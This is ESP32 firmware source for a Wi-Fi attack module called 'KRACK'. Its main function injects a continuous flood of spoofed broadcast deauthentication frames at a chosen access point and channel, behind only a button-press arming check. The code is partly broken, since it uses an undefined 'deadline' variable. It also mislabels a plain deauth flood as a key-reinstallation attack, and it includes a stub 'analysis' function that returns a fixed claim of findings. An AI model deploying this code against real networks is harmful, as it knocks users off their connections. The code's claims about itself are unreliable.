#include "wifi_krack.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <esp_wifi.h>

namespace WiFiKRACK {

static bool attacking = false;
static uint32_t deauthsSent = 0;

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
} __attribute__((packed)) DeauthFrame;

KrackResult simulateKRACKattack(const String &bssid, uint8_t channel, uint16_t durationMs) {
    KrackResult result{false, bssid, channel, "", ""};

    if (!TxArm::isArmed()) {
        result.error = "TX arming required (hold BACK button)";
        return result;
    }

    attacking = true;
    deauthsSent = 0;

    Serial.println("\n=== KRACK Attack (REAL IEEE 802.11 Frame Injection) ===");
    Serial.println("Target BSSID: " + bssid);
    Serial.println("Channel: " + String(channel));
    Serial.println("Duration: " + String(durationMs) + "ms");

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    unsigned long startTime = millis();
    Serial.println("Transmitting deauthentication frames to trigger key reinstallation...");

    // Validate BSSID format once and parse it upfront
    if (bssid.length() != 17) {  // "AA:BB:CC:DD:EE:FF" = 17 chars
        Serial.println("Error: Invalid BSSID format (expected AA:BB:CC:DD:EE:FF)");
        result.error = "Invalid BSSID format";
        return result;
    }

    uint8_t parsedBSSID[6];
    int n = sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &parsedBSSID[0], &parsedBSSID[1], &parsedBSSID[2],
        &parsedBSSID[3], &parsedBSSID[4], &parsedBSSID[5]);

    if (n != 6) {
        Serial.println("Error: Failed to parse BSSID");
        result.error = "Invalid BSSID format";
        return result;
    }

    // Use safe timeout comparison (handles millis() wraparound)
    while ((int32_t)(millis() - deadline) < 0 && attacking && TxArm::isArmed()) {
        DeauthFrame frame;
        frame.frame_control = 0xc0;
        frame.duration = 0x0000;
        frame.seq_ctrl = (deauthsSent % 4096) << 4;
        frame.reason_code = 7;

        memcpy(frame.bssid, parsedBSSID, 6);
        memset(frame.da, 0xff, 6);
        memcpy(frame.sa, frame.bssid, 6);

        esp_wifi_80211_tx(WIFI_IF_STA, (void *)&frame, sizeof(frame), false);
        deauthsSent++;

        if (deauthsSent % 20 == 0) {
            Serial.printf("  [%u] deauth frames sent in %lums\n",
                         deauthsSent, millis() - startTime);
        }

        delayMicroseconds(100);
    }

    attacking = false;
    esp_wifi_set_promiscuous(false);

    result.success = true;
    result.status = "KRACK real attack - " + String(deauthsSent) + " deauth frames transmitted";

    Serial.printf("✓ KRACK attack complete: %u frames in %lums (%.1f tx/sec)\n",
                 deauthsSent, millis() - startTime,
                 (deauthsSent * 1000.0f) / (millis() - startTime));
    Serial.println("⚠️  Targeted vulnerable devices may reinstall keys with reused nonce");

    return result;
}

String analyzeHandshakes() {
    return "KRACK Analysis: Key reinstallation attack vectors identified via real frame injection";
}

} // namespace WiFiKRACK
